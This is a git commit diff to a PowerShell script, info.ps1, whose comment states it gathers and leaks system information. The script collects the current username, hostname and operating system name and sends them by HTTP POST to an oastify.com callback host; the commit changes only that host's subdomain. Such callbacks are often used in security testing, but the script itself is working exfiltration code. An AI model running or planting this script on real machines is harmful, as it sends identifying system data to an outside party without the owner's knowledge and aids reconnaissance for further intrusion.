f36243a4bb4adee93f71c50ac9312114ad0e4a15
jaat301 <68196478+jaat301@users.noreply.github.com>
2025-06-03 01:56:39 +0530

    Update info.ps1

--- info.ps1
+++ info.ps1
@@ -1,3 +1,3 @@
 # info.ps1 - Gathers and leaks system info via HTTP POST
 $data = whoami + "_" + hostname + "_" + (Get-WmiObject Win32_OperatingSystem).Caption
-Invoke-WebRequest -Uri "http://2mputrvkxjz4wztee8zhobjwa2lqstg1.oastify.com" -Method POST -Body $data
+Invoke-WebRequest -Uri "http://58bnnq88b1bcciqgu6gvfo3sqjwck28r.oastify.com" -Method POST -Body $data
